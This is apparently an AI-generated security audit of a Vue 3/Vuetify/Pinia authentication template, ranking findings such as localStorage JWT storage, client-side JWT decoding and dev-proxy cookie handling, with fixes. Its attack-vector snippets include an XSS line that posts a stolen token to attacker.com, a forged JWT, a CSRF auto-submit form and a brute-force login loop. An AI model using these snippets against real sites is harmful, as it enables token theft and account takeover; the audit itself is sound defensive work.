# Security Audit: veoci-app-template-construct

**Audit Date:** 2025-11-27
**Auditor:** Cypher
**Scope:** Vue 3 + Vuetify + Pinia authentication template for Veoci apps

---

## Executive Summary

This template exhibits **critical security vulnerabilities** related to token storage, XSS exposure, and development proxy configuration. While the MFA implementation and routing guards show security awareness, the fundamental authentication architecture is vulnerable to common web attacks.

**Risk Level:** HIGH
**Critical Findings:** 3
**High Findings:** 4
**Medium Findings:** 3
**Low Findings:** 2

---

## CRITICAL Findings

### C-1: JWT Storage in localStorage (XSS Vulnerability)

**Severity:** CRITICAL
**CWE:** CWE-522 (Insufficiently Protected Credentials)

**Description:**
Authentication tokens are stored in `localStorage` (line 321, architecture.md), making them accessible to any JavaScript code running in the same origin. This creates a critical XSS vulnerability surface.

**Attack Vector:**
```javascript
// Malicious script injected via XSS
const token = localStorage.getItem('authToken');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token })
});
```

**Impact:**
- Complete account takeover if XSS vulnerability exists anywhere in the app
- Token exfiltration persists across sessions
- Single XSS flaw compromises all user sessions

**Evidence:**
- Architecture doc line 321: "authToken → localStorage"
- Line 444-448: Token lifecycle depends on localStorage persistence
- Line 521: Acknowledged as "XSS vulnerable"

**Recommendation:**
- **Immediate:** Switch to httpOnly cookies for token storage
- **Alternative:** Use sessionStorage (limits to single tab) as temporary mitigation
- **Best Practice:** Backend sets httpOnly, Secure, SameSite=Strict cookie after authentication
- **Code Change Required:**
  ```typescript
  // Remove from auth store:
  // localStorage.setItem('authToken', token)

  // Backend should set cookie instead:
  // Set-Cookie: authToken=xxx; HttpOnly; Secure; SameSite=Strict
  ```

---

### C-2: Client-Side JWT Decoding Exposes Token Claims

**Severity:** CRITICAL
**CWE:** CWE-200 (Exposure of Sensitive Information)

**Description:**
The application uses `jwt-decode` (client-side) to parse JWT tokens. This library does NOT validate signatures—it merely base64-decodes the payload. Any attacker can craft a malicious JWT with arbitrary claims.

**Attack Vector:**
```javascript
// Attacker crafts fake token
const fakeToken = btoa(JSON.stringify({ header })) + '.' +
                  btoa(JSON.stringify({
                    userId: 'admin',
                    role: 'superadmin',
                    exp: 9999999999
                  })) + '.fakesignature';

localStorage.setItem('authToken', fakeToken);
// App reads decoded token without server validation
```

**Impact:**
- Privilege escalation if client-side authorization decisions are made
- Session tampering without detection
- Route guards bypass if token expiry is only checked client-side

**Evidence:**
- Dependencies: `jwt-decode ^4.0.0`
- Line 452: "isAuthenticated computed from token presence" (not validation)
- Line 206: Route guard checks `authStore.isAuthenticated` (client-side only)

**Recommendation:**
- **NEVER** trust client-side JWT decoding for authorization decisions
- **ALL** API calls must validate token server-side
- Client-side token should only determine UI state (show/hide login form)
- Add explicit note in code:
  ```typescript
  // WARNING: jwt-decode does NOT validate signatures!
  // This is ONLY for reading non-sensitive claims (display name, etc.)
  // NEVER use for authorization - server MUST validate on every request
  ```

---

### C-3: VeociJS SDK Exposed on window Object in Dev Mode

**Severity:** CRITICAL
**CWE:** CWE-489 (Active Debug Code)

**Description:**
The API client exposes the VeociJS SDK instance to `window.veociApi` in development mode. This creates a direct attack surface for token extraction and API manipulation.

**Attack Vector:**
```javascript
// In browser console (dev mode):
const token = window.veociApi.getToken(); // If SDK exposes token getter
// Or inspect network requests via SDK
window.veociApi.makeUnauthorizedCall('/admin/delete-all-users');
```

**Impact:**
- Direct API access bypass authentication checks
- Token extraction if SDK exposes internals
- Debugging information leakage (endpoints, parameters)
- Accidental production deployment exposes APIs globally

**Evidence:**
- Architecture doc mentions "window object" exposure (line 521)
- API client configuration: "Exposes veociApi on window in dev mode"

**Recommendation:**
- **Remove entirely** unless absolutely necessary for debugging
- If required, implement gated access:
  ```typescript
  if (import.meta.env.MODE === 'development' &&
      localStorage.getItem('ENABLE_DEBUG') === 'true') {
    window.__VEOCI_DEBUG__ = {
      // Only expose non-sensitive helpers
      logState: () => console.log(store.getState()),
      // NEVER expose: tokens, SDK instance, API client
    };
  }
  ```
- Add **build-time check** to fail CI if window exposure exists in production bundle

---

## HIGH Findings

### H-1: No CSRF Protection for State-Changing Operations

**Severity:** HIGH
**CWE:** CWE-352 (Cross-Site Request Forgery)

**Description:**
If tokens are stored in cookies (recommended fix for C-1), the application becomes vulnerable to CSRF attacks without explicit CSRF tokens.

**Attack Vector:**
```html
<!-- Attacker's site -->
<form action="https://veoci-app.com/api/v1/user/delete" method="POST">
  <input type="hidden" name="userId" value="victim-id">
</form>
<script>document.forms[0].submit();</script>
<!-- Browser auto-sends cookies, request succeeds -->
```

**Impact:**
- Unauthorized state changes (data modification, deletion)
- Account takeover if profile update endpoints exist
- Social engineering amplifies impact

**Recommendation:**
- Implement **CSRF tokens** for all POST/PUT/DELETE requests
- Use **SameSite=Strict** cookie attribute (blocks cross-site requests)
- Add custom header requirement:
  ```typescript
  // Client sends:
  headers: { 'X-Requested-With': 'XMLHttpRequest' }
  // Server rejects requests without this header
  ```

---

### H-2: Development Proxy Strips Secure Flag from Cookies

**Severity:** HIGH
**CWE:** CWE-614 (Sensitive Cookie Without Secure Flag)

**Description:**
The Rsbuild dev proxy configuration strips the `Secure` flag from cookies, allowing them to be transmitted over HTTP.

**Attack Vector:**
```
Dev environment on http://localhost:3000
Attacker on same network sniffs HTTP traffic
Cookie transmitted without encryption:
  Cookie: authToken=eyJhbGc...
Attacker replays cookie to gain authenticated access
```

**Impact:**
- Man-in-the-middle attacks in development
- Developers trained to accept insecure cookies
- Accidental production misconfiguration (if dev config copied)

**Evidence:**
- Line 224: "Cookie forwarding enabled"
- rsbuild.config.ts: "Strips 'Secure' flag from cookies in dev"

**Recommendation:**
- Use **HTTPS in development** (mkcert for local certificates)
- Do NOT strip Secure flag—fix the root cause
- Add warning banner in dev mode:
  ```typescript
  if (import.meta.env.MODE === 'development') {
    console.warn('⚠️ DEV MODE: Cookies transmitted over HTTP. Use HTTPS in production!');
  }
  ```

---

### H-3: Origin Header Rewrite Bypasses CORS Intent

**Severity:** HIGH
**CWE:** CWE-346 (Origin Validation Error)

**Description:**
The proxy rewrites the `Origin` header, defeating CORS protections. While necessary for development, this pattern can leak into production or teach developers to disable CORS.

**Attack Vector:**
```javascript
// Attacker hosts malicious site that proxies requests
// If production app uses similar proxy config:
fetch('https://veoci-api.com/api/v1/sensitive-data', {
  // Rewritten Origin bypasses CORS check
})
```

**Impact:**
- CORS protections nullified
- Cross-origin attacks become trivial
- Compliance violations (OWASP, PCI-DSS require proper CORS)

**Recommendation:**
- **Never** use Origin rewriting in production
- Set explicit CORS allowlist on backend:
  ```
  Access-Control-Allow-Origin: https://app.veoci.com
  Access-Control-Allow-Credentials: true
  ```
- Add runtime check:
  ```typescript
  if (import.meta.env.PROD && proxyConfig.rewriteOrigin) {
    throw new Error('Origin rewrite MUST be disabled in production');
  }
  ```

---

### H-4: No Rate Limiting on Login Endpoints

**Severity:** HIGH
**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)

**Description:**
The authentication flow lacks client-side rate limiting. While the backend may implement this, the client should also throttle requests to prevent brute-force attacks and credential stuffing.

**Attack Vector:**
```javascript
// Automated attack script
for (const password of passwordList) {
  await authStore.login('victim@example.com', password);
  // No client-side throttling observed
}
```

**Impact:**
- Brute-force password attacks
- Account enumeration via timing differences
- Distributed credential stuffing

**Recommendation:**
- Implement **exponential backoff** after failed attempts:
  ```typescript
  let failedAttempts = 0;
  async function login(username: string, password: string) {
    if (failedAttempts > 3) {
      const delay = Math.min(2 ** failedAttempts * 1000, 30000);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
    try {
      await veociApi.login(username, password);
      failedAttempts = 0;
    } catch (error) {
      failedAttempts++;
      throw error;
    }
  }
  ```
- Display **CAPTCHA** after 3 failed attempts
- Backend MUST also implement rate limiting (client-side is bypassable)

---

## MEDIUM Findings

### M-1: No Content Security Policy (CSP)

**Severity:** MEDIUM
**CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers)

**Description:**
No CSP headers are configured, allowing inline scripts and arbitrary resource loading. This amplifies XSS impact.

**Recommendation:**
```html
<!-- Add to index.html or HTTP headers -->
<meta http-equiv="Content-Security-Policy"
      content="
        default-src 'self';
        script-src 'self' 'unsafe-eval';
        style-src 'self' 'unsafe-inline';
        connect-src 'self' https://api.veoci.com;
        img-src 'self' data: https:;
      ">
```

---

### M-2: MFA Token Handling in Client State

**Severity:** MEDIUM
**CWE:** CWE-311 (Missing Encryption of Sensitive Data)

**Description:**
The MFA flow stores `mfaToken` in the auth store (likely as plain state). This token should be treated as sensitively as the auth token.

**Evidence:**
- Line 132-138: MFA token passed between login steps
- Line 306: `mfaRequired: boolean` in state (implies mfaToken also stored)

**Recommendation:**
- Store MFA token in **memory only** (component state, not Pinia store)
- Clear immediately after successful MFA verification
- Never log or expose in error messages:
  ```typescript
  // BAD:
  console.error('MFA failed for token:', mfaToken);

  // GOOD:
  console.error('MFA verification failed');
  ```

---

### M-3: Token Refresh Race Condition Potential

**Severity:** MEDIUM
**CWE:** CWE-362 (Concurrent Execution using Shared Resource)

**Description:**
The `refreshSession()` method (line 315) may be called concurrently by multiple components or timers, leading to duplicate refresh requests or token mismatch.

**Recommendation:**
```typescript
let refreshPromise: Promise<string> | null = null;

async function refreshSession() {
  if (refreshPromise) {
    return refreshPromise; // Reuse in-flight request
  }

  refreshPromise = veociApi.refreshToken()
    .then(newToken => {
      this.authToken = newToken;
      return newToken;
    })
    .finally(() => {
      refreshPromise = null;
    });

  return refreshPromise;
}
```

---

## LOW Findings

### L-1: Verbose Error Messages May Leak Information

**Severity:** LOW
**CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)

**Description:**
API error messages may expose internal details (stack traces, database errors, endpoint paths).

**Recommendation:**
- Sanitize error messages before displaying:
  ```typescript
  catch (error) {
    if (import.meta.env.PROD) {
      console.error('Sanitized production error');
      return { message: 'Authentication failed. Please try again.' };
    }
    console.error('Dev error:', error); // Full details in dev only
  }
  ```

---

### L-2: No Subresource Integrity (SRI) for External Resources

**Severity:** LOW
**CWE:** CWE-353 (Missing Support for Integrity Check)

**Description:**
If external CDN resources are used (Vuetify fonts, etc.), lack of SRI allows CDN compromise to inject malicious code.

**Recommendation:**
```html
<link rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/vuetify@3.x/dist/vuetify.min.css"
      integrity="sha384-..."
      crossorigin="anonymous">
```

---

## Dependency Vulnerabilities

### Axios 1.9.0
- **Status:** Check for known CVEs (use `npm audit` or `yarn audit`)
- **Recommendation:** Update to latest stable version regularly

### jwt-decode 4.0.0
- **Issue:** No vulnerability, but misuse is dangerous (see C-2)
- **Recommendation:** Document that this library does NOT validate tokens

### qs 6.14.0
- **Status:** Check for prototype pollution vulnerabilities
- **Recommendation:** Pin version, monitor security advisories

---

## Development Proxy Security Impact

The Rsbuild dev proxy configuration introduces several risks:

1. **Cookie Security Downgrade** (H-2)
2. **Origin Validation Bypass** (H-3)
3. **Environment Confusion:** Developers may not understand production differs

**Recommendations:**
- Add explicit comments in `rsbuild.config.ts`:
  ```typescript
  // ⚠️ DEV ONLY: These settings MUST NOT be used in production
  // - Secure flag stripping allows HTTP cookies (insecure)
  // - Origin rewriting bypasses CORS (security hole)
  // Production MUST use HTTPS with proper CORS headers
  ```
- Create separate `rsbuild.config.prod.ts` with no proxy
- Add CI check to ensure dev proxy settings don't reach production

---

## Client-Side Route Guard Limitations

**Current Implementation:**
```typescript
if (to.meta.requiresAuth && !authStore.isAuthenticated) {
  next('/login')
}
```

**Issues:**
1. Client-side checks are **advisory only**—attacker can modify client code
2. No server-side validation mentioned in architecture
3. Token presence != valid token (see C-2)

**Recommendations:**
- **All** API endpoints MUST validate tokens server-side
- Client-side guards are UX optimization, NOT security
- Add comment:
  ```typescript
  // Client-side route guard for UX only
  // Security: Server MUST validate token on every API request
  ```

---

## Summary of Recommended Actions

### Immediate (Critical)
1. Migrate from localStorage to httpOnly cookies (C-1)
2. Remove window.veociApi exposure or gate strictly (C-3)
3. Add server-side token validation on all endpoints (C-2)
4. Document jwt-decode is NOT security validation (C-2)

### Short-Term (High)
1. Implement CSRF protection for cookie-based auth (H-1)
2. Enable HTTPS in development (H-2)
3. Add client-side rate limiting (H-4)
4. Create separate production build config (H-3)

### Medium-Term (Medium/Low)
1. Add Content Security Policy headers (M-1)
2. Handle MFA token in memory only (M-2)
3. Implement refresh token mutex (M-3)
4. Sanitize error messages for production (L-1)
5. Run `npm audit` and update dependencies

### Continuous
1. Regular security dependency updates
2. Penetration testing of authentication flow
3. Code review for XSS vulnerabilities
4. Monitor for new VeociJS SDK vulnerabilities

---

## Risk Matrix

| Finding | Severity | Exploitability | Impact | Remediation Effort |
|---------|----------|----------------|--------|-------------------|
| C-1: localStorage tokens | Critical | High | Critical | Medium |
| C-2: Client-side JWT decode | Critical | Medium | High | Low (document) |
| C-3: window.veociApi | Critical | High | High | Low |
| H-1: No CSRF protection | High | Medium | High | Medium |
| H-2: Secure flag stripping | High | Medium | Medium | Low |
| H-3: Origin rewrite | High | Low | High | Low |
| H-4: No rate limiting | High | High | Medium | Medium |
| M-1: No CSP | Medium | Medium | Medium | Low |
| M-2: MFA token storage | Medium | Low | Medium | Low |
| M-3: Refresh race condition | Medium | Low | Low | Medium |
| L-1: Verbose errors | Low | Low | Low | Low |
| L-2: No SRI | Low | Low | Medium | Low |

---

## Conclusion

This template demonstrates **good architectural patterns** (Pinia stores, route guards, MFA support) but has **fundamental authentication security flaws**. The localStorage token storage and client-side JWT decoding create a house of cards—any XSS vulnerability becomes critical.

**The system is functional but not production-ready from a security perspective.**

Before deploying to production:
1. Fix all CRITICAL findings
2. Address HIGH findings
3. Add security testing to CI/CD
4. Conduct penetration test of authentication flow

**"I know what you're thinking, because right now I'm thinking the same thing. Actually, I've been thinking it ever since I got here. Why, oh why, didn't I take the blue pill?"**

---

## File References

All findings reference:
- `/home/w3surf/.claude/cache/construct/veoci-app-template-construct/architecture.md`

Specific line references:
- L321: localStorage persistence
- L444-464: Token lifecycle
- L521: Acknowledged XSS vulnerability
- L206: Route guard implementation
- L224: Cookie forwarding in proxy
- L132-138: MFA token flow

---

Wake up, Neo.
